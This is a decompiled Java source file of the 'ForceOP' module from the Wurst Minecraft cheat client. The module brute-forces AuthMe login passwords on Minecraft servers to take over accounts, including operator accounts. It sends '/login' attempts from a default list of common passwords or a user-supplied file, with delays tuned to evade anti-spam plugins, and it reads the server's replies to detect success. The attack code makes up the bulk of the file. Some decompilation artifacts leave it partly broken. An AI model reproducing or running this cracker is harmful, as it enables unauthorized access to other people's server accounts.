// 
// Decompiled by Procyon v0.6.0
// 

package net.wurstclient.features.mods.chat;

import java.awt.event.ActionEvent;
import javax.swing.event.ChangeEvent;
import net.wurstclient.WurstClient;
import java.util.concurrent.TimeUnit;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.ArrayList;
import net.wurstclient.util.ChatUtils;
import javax.swing.SpinnerModel;
import javax.swing.SpinnerNumberModel;
import java.net.URI;
import java.awt.Desktop;
import java.awt.Font;
import javax.swing.JOptionPane;
import java.io.File;
import javax.swing.filechooser.FileFilter;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.JFileChooser;
import javax.swing.AbstractButton;
import javax.swing.ButtonGroup;
import net.wurstclient.files.WurstFolders;
import java.awt.event.WindowListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowAdapter;
import java.awt.LayoutManager;
import java.awt.Component;
import net.wurstclient.hooks.FrameHook;
import java.awt.Frame;
import net.wurstclient.files.ConfigFiles;
import net.wurstclient.features.Feature;
import javax.swing.UIManager;
import net.wurstclient.Category;
import javax.swing.JCheckBox;
import javax.swing.JSpinner;
import javax.swing.JSeparator;
import javax.swing.JButton;
import javax.swing.JRadioButton;
import javax.swing.JLabel;
import javax.swing.JDialog;
import net.wurstclient.features.DontSaveState;
import net.wurstclient.features.Bypasses;
import net.wurstclient.features.HelpPage;
import net.wurstclient.features.SearchTags;
import net.wurstclient.events.ChatInputListener;
import net.wurstclient.features.Hack;

@SearchTags({ "Force OP", "AuthMe Cracker", "AuthMeCracker", "auth me cracker", "admin hack", "AuthMe password cracker" })
@HelpPage("Mods/Force_OP_(AuthMeCracker)")
@Bypasses
@DontSaveState
public final class ForceOpMod extends Hack implements ChatInputListener
{
    private final String[] defaultList;
    private String[] passwords;
    private JDialog dialog;
    private JLabel lPWList;
    private JRadioButton rbDefaultList;
    private JRadioButton rbTXTList;
    private JButton bTXTList;
    private JButton bHowTo;
    private JSeparator sepListSpeed;
    private JLabel lSpeed;
    private JLabel lDelay1;
    private JSpinner spDelay;
    private JLabel lDelay2;
    private JCheckBox cbDontWait;
    private JSeparator sepSpeedStart;
    private JLabel lName;
    private JLabel lPasswords;
    private JLabel lTime;
    private JButton bStart;
    private boolean gotWrongPWMSG;
    private int lastPW;
    private JLabel lAttempts;
    
    public ForceOpMod() {
        super("ForceOP", "Cracks AuthMe passwords. Can be used to get OP.");
        this.defaultList = new String[] { "password", "passwort", "password1", "passwort1", "password123", "passwort123", "pass", "pw", "pw1", "pw123", "hallo", "Wurst", "wurst", "1234", "12345", "123456", "1234567", "12345678", "123456789", "login", "register", "test", "sicher", "me", "penis", "penis1", "penis123", "minecraft", "minecraft1", "minecraft123", "mc", "admin", "server", "yourmom", "tester", "account", "creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz", "ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou" };
        this.passwords = new String[0];
        this.setCategory(Category.CHAT);
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        }
        catch (final Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public Feature[] getSeeAlso() {
        return new Feature[] { ForceOpMod.WURST.special.bookHackSpf };
    }
    
    @Override
    public void onEnable() {
        new Thread(() -> this.createDialog()).start();
        ForceOpMod.EVENTS.add(ChatInputListener.class, this);
    }
    
    @Override
    public void onDisable() {
        ForceOpMod.EVENTS.remove(ChatInputListener.class, this);
        new Thread(() -> {
            if (this.dialog != null) {
                this.dialog.dispose();
            }
        }).start();
    }
    
    private void createDialog() {
        this.lastPW = -1;
        ConfigFiles.OPTIONS.load();
        (this.dialog = new JDialog((Frame)null, this.getName(), false)).setAlwaysOnTop(true);
        this.dialog.setSize(512, 248);
        this.dialog.setResizable(false);
        this.dialog.setLocationRelativeTo(FrameHook.getFrame());
        this.dialog.setLayout(null);
        this.dialog.setDefaultCloseOperation(2);
        this.dialog.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(final WindowEvent e) {
                ForceOpMod.WURST.hax.forceOpMod.setEnabled(false);
            }
        });
        (this.lPWList = new JLabel("Password list")).setLocation(4, 4);
        this.lPWList.setSize(this.lPWList.getPreferredSize());
        this.dialog.add(this.lPWList);
        (this.rbDefaultList = new JRadioButton("default", ForceOpMod.WURST.options.forceOPList.equals(WurstFolders.MAIN.toString()))).setLocation(4, 24);
        this.rbDefaultList.setSize(this.rbDefaultList.getPreferredSize());
        this.dialog.add(this.rbDefaultList);
        (this.rbTXTList = new JRadioButton("TXT file", !this.rbDefaultList.isSelected())).setLocation(this.rbDefaultList.getX() + this.rbDefaultList.getWidth() + 4, 24);
        this.rbTXTList.setSize(this.rbTXTList.getPreferredSize());
        this.rbTXTList.addChangeListener(e -> {
            this.bTXTList.setEnabled(this.rbTXTList.isSelected());
            if (!this.rbTXTList.isSelected()) {
                ForceOpMod.WURST.options.forceOPList = WurstFolders.MAIN.toString();
                ConfigFiles.OPTIONS.save();
            }
            this.loadPWList();
            this.update();
            return;
        });
        this.dialog.add(this.rbTXTList);
        final ButtonGroup bgList = new ButtonGroup();
        bgList.add(this.rbDefaultList);
        bgList.add(this.rbTXTList);
        (this.bTXTList = new JButton("browse")).setLocation(this.rbTXTList.getX() + this.rbTXTList.getWidth() + 4, 24);
        this.bTXTList.setSize(this.bTXTList.getPreferredSize());
        this.bTXTList.setEnabled(this.rbTXTList.isSelected());
        this.bTXTList.addActionListener(e -> {
            final JFileChooser fsTXTList = new JFileChooser();
            fsTXTList.setAcceptAllFileFilterUsed(false);
            new FileNameExtensionFilter("TXT files", new String[] { "txt" });
            final FileNameExtensionFilter filter;
            final Object o;
            ((JFileChooser)o).addChoosableFileFilter(filter);
            fsTXTList.setFileSelectionMode(0);
            fsTXTList.setCurrentDirectory(new File(ForceOpMod.WURST.options.forceOPList));
            final int action = fsTXTList.showOpenDialog(this.dialog);
            if (action == 0) {
                if (!fsTXTList.getSelectedFile().exists()) {
                    JOptionPane.showMessageDialog(this.dialog, "File does not exist!", "Error", 0);
                }
                else {
                    ForceOpMod.WURST.options.forceOPList = fsTXTList.getSelectedFile().getPath();
                    ConfigFiles.OPTIONS.save();
                }
            }
            this.loadPWList();
            this.update();
            return;
        });
        this.dialog.add(this.bTXTList);
        (this.bHowTo = new JButton("How to use")).setFont(new Font(this.bHowTo.getFont().getName(), 1, 16));
        this.bHowTo.setSize(this.bHowTo.getPreferredSize());
        this.bHowTo.setLocation(506 - this.bHowTo.getWidth() - 32, 12);
        this.bHowTo.addActionListener(e -> {
            try {
                final String howToLink = "http://www.wurstclient.net/Mods/Force_OP_(AuthMeCracker)/";
                Desktop.getDesktop().browse(new URI(howToLink));
            }
            catch (final Throwable var5) {
                var5.printStackTrace();
            }
            return;
        });
        this.dialog.add(this.bHowTo);
        (this.sepListSpeed = new JSeparator()).setLocation(4, 56);
        this.sepListSpeed.setSize(498, 4);
        this.dialog.add(this.sepListSpeed);
        (this.lSpeed = new JLabel("Speed")).setLocation(4, 64);
        this.lSpeed.setSize(this.lSpeed.getPreferredSize());
        this.dialog.add(this.lSpeed);
        (this.lDelay1 = new JLabel("Delay between attempts:")).setLocation(4, 84);
        this.lDelay1.setSize(this.lDelay1.getPreferredSize());
        this.dialog.add(this.lDelay1);
        (this.spDelay = new JSpinner()).setToolTipText("<html>50ms: fastest, doesn't bypass AntiSpam plugins<br>1.000ms: recommended, bypasses most AntiSpam plugins<br>10.000ms: slowest, bypasses all AntiSpam plugins</html>");
        this.spDelay.setModel(new SpinnerNumberModel(ForceOpMod.WURST.options.forceOPDelay, 50, 10000, 50));
        this.spDelay.setLocation(this.lDelay1.getX() + this.lDelay1.getWidth() + 4, 84);
        this.spDelay.setSize(60, (int)this.spDelay.getPreferredSize().getHeight());
        this.spDelay.addChangeListener(e -> {
            ForceOpMod.WURST.options.forceOPDelay = (int)this.spDelay.getValue();
            ConfigFiles.OPTIONS.save();
            this.update();
            return;
        });
        this.dialog.add(this.spDelay);
        (this.lDelay2 = new JLabel("ms")).setLocation(this.spDelay.getX() + this.spDelay.getWidth() + 4, 84);
        this.lDelay2.setSize(this.lDelay2.getPreferredSize());
        this.dialog.add(this.lDelay2);
        (this.cbDontWait = new JCheckBox("<html>Don't wait for \"<span style=\"color: rgb(192, 0, 0);\"><b>Wrong password!</b></span>\" messages</html>", ForceOpMod.WURST.options.forceOPDontWait)).setToolTipText("Increases the speed but can cause inaccuracy.");
        this.cbDontWait.setLocation(4, 104);
        this.cbDontWait.setSize(this.cbDontWait.getPreferredSize());
        this.cbDontWait.addActionListener(e -> {
            ForceOpMod.WURST.options.forceOPDontWait = this.cbDontWait.isSelected();
            ConfigFiles.OPTIONS.save();
            this.update();
            return;
        });
        this.dialog.add(this.cbDontWait);
        (this.sepSpeedStart = new JSeparator()).setLocation(4, 132);
        this.sepSpeedStart.setSize(498, 4);
        this.dialog.add(this.sepSpeedStart);
        (this.lName = new JLabel("Username: " + ForceOpMod.MC.session.getUsername())).setLocation(4, 140);
        this.lName.setSize(this.lName.getPreferredSize());
        this.dialog.add(this.lName);
        (this.lPasswords = new JLabel("Passwords: error")).setLocation(4, 160);
        this.lPasswords.setSize(this.lPasswords.getPreferredSize());
        this.dialog.add(this.lPasswords);
        (this.lTime = new JLabel("Estimated time: error")).setLocation(4, 180);
        this.lTime.setSize(this.lTime.getPreferredSize());
        this.dialog.add(this.lTime);
        (this.lAttempts = new JLabel("Attempts: error")).setLocation(4, 200);
        this.lAttempts.setSize(this.lAttempts.getPreferredSize());
        this.dialog.add(this.lAttempts);
        (this.bStart = new JButton("Start")).setFont(new Font(this.bHowTo.getFont().getName(), 1, 18));
        this.bStart.setLocation(302, 144);
        this.bStart.setSize(192, 66);
        this.bStart.addActionListener(e -> this.startForceOP());
        this.dialog.add(this.bStart);
        this.loadPWList();
        this.update();
        ForceOpMod.MC.setIngameNotInFocus();
        this.dialog.setVisible(true);
        this.dialog.toFront();
    }
    
    private void startForceOP() {
        this.lPWList.setEnabled(false);
        this.rbDefaultList.setEnabled(false);
        this.rbTXTList.setEnabled(false);
        this.bTXTList.setEnabled(false);
        this.bHowTo.setEnabled(false);
        this.sepListSpeed.setEnabled(false);
        this.lSpeed.setEnabled(false);
        this.lDelay1.setEnabled(false);
        this.spDelay.setEnabled(false);
        this.lDelay2.setEnabled(false);
        this.cbDontWait.setEnabled(false);
        this.sepSpeedStart.setEnabled(false);
        this.lName.setEnabled(false);
        this.lPasswords.setEnabled(false);
        this.bStart.setEnabled(false);
        new Thread(() -> this.runForceOP(), "ForceOP").start();
    }
    
    private void runForceOP() {
        ForceOpMod.MC.player.sendChatMessage("/login " + ForceOpMod.MC.session.getUsername());
        this.lastPW = 0;
        this.loadPWList();
        this.update();
        for (int i = 0; i < this.passwords.length; ++i) {
            if (!ForceOpMod.WURST.hax.forceOpMod.isActive()) {
                return;
            }
            if (!this.cbDontWait.isSelected()) {
                this.gotWrongPWMSG = false;
            }
            while ((!this.cbDontWait.isSelected() && !this.hasGotWrongPWMSG()) || ForceOpMod.MC.player == null) {
                if (!ForceOpMod.WURST.hax.forceOpMod.isActive()) {
                    return;
                }
                try {
                    Thread.sleep(50L);
                }
                catch (final InterruptedException e) {
                    e.printStackTrace();
                }
                if (ForceOpMod.MC.player != null) {
                    continue;
                }
                this.gotWrongPWMSG = true;
            }
            try {
                Thread.sleep(ForceOpMod.WURST.options.forceOPDelay);
            }
            catch (final InterruptedException e) {
                e.printStackTrace();
            }
            boolean sent = false;
            while (!sent) {
                try {
                    ForceOpMod.MC.player.sendChatMessage("/login " + this.passwords[i]);
                    sent = true;
                }
                catch (final Exception e2) {
                    try {
                        Thread.sleep(50L);
                    }
                    catch (final InterruptedException e3) {
                        e3.printStackTrace();
                    }
                }
            }
            this.lastPW = i + 1;
            this.update();
        }
        ChatUtils.failure("All " + (this.lastPW + 1) + " passwords were wrong.");
    }
    
    private void loadPWList() {
        Label_0224: {
            if (this.rbTXTList.isSelected() && !ForceOpMod.WURST.options.forceOPList.equals(WurstFolders.MAIN.toString())) {
                try {
                    final File pwList = new File(ForceOpMod.WURST.options.forceOPList);
                    final ArrayList<String> loadedPWs = new ArrayList<String>();
                    Throwable t = null;
                    try {
                        final BufferedReader load = new BufferedReader(new FileReader(pwList));
                        try {
                            String line = "";
                            while ((line = load.readLine()) != null) {
                                loadedPWs.add(line);
                            }
                        }
                        finally {
                            if (load != null) {
                                load.close();
                            }
                        }
                    }
                    finally {
                        if (t == null) {
                            final Throwable exception;
                            t = exception;
                        }
                        else {
                            final Throwable exception;
                            if (t != exception) {
                                t.addSuppressed(exception);
                            }
                        }
                    }
                    this.passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
                    break Label_0224;
                }
                catch (final IOException e) {
                    e.printStackTrace();
                    JOptionPane.showMessageDialog(this.dialog, "Error: " + e.getMessage(), "Error", 0);
                    return;
                }
            }
            this.passwords = this.defaultList;
        }
        this.lPasswords.setText("Passwords: " + (this.passwords.length + 1));
        this.lPasswords.setSize(this.lPasswords.getPreferredSize());
    }
    
    private void update() {
        long timeMS = (this.passwords.length + 1 - this.lastPW) * (int)this.spDelay.getValue();
        timeMS += (int)(timeMS / 30000L * 5000L);
        if (!this.cbDontWait.isSelected()) {
            timeMS += timeMS / (int)this.spDelay.getValue() * 50L;
        }
        final String timeString = String.valueOf(TimeUnit.MILLISECONDS.toDays(timeMS)) + "d " + (TimeUnit.MILLISECONDS.toHours(timeMS) - TimeUnit.DAYS.toHours(TimeUnit.MILLISECONDS.toDays(timeMS))) + "h " + (TimeUnit.MILLISECONDS.toMinutes(timeMS) - TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS.toHours(timeMS))) + "m " + (TimeUnit.MILLISECONDS.toSeconds(timeMS) - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(timeMS))) + "s";
        this.lTime.setText("Estimated time: " + timeString);
        this.lTime.setSize(this.lTime.getPreferredSize());
        this.lAttempts.setText("Attempts: " + (this.lastPW + 1) + "/" + (this.passwords.length + 1));
        this.lAttempts.setSize(this.lAttempts.getPreferredSize());
    }
    
    @Override
    public void onReceivedMessage(final ChatInputEvent event) {
        final String message = event.getComponent().getUnformattedText();
        if (message.startsWith("§c[§6Wurst§c]§f ")) {
            return;
        }
        if (message.toLowerCase().contains("wrong") || message.toLowerCase().contains("falsch") || message.toLowerCase().contains("incorrect") || message.toLowerCase().contains("mauvais") || message.toLowerCase().contains("mal") || message.toLowerCase().contains("sbagliato")) {
            this.gotWrongPWMSG = true;
        }
        else if (message.toLowerCase().contains("success") || message.toLowerCase().contains("erfolg") || message.toLowerCase().contains("succ\ufffds") || message.toLowerCase().contains("\ufffdxito")) {
            if (this.lastPW == -1) {
                return;
            }
            String password;
            if (this.lastPW == 0) {
                password = ForceOpMod.MC.session.getUsername();
            }
            else {
                password = this.passwords[this.lastPW - 1];
            }
            ChatUtils.success("The password \"" + password + "\" worked.");
            this.setEnabled(false);
        }
        else if (message.toLowerCase().contains("/help") || message.toLowerCase().contains("permission")) {
            ChatUtils.warning("It looks like this server doesn't have AuthMe.");
        }
        else if (message.toLowerCase().contains("logged in") || message.toLowerCase().contains("eingeloggt") || message.toLowerCase().contains("eingelogt")) {
            ChatUtils.warning("It looks like you are already logged in.");
        }
    }
    
    private boolean hasGotWrongPWMSG() {
        return this.gotWrongPWMSG;
    }
}
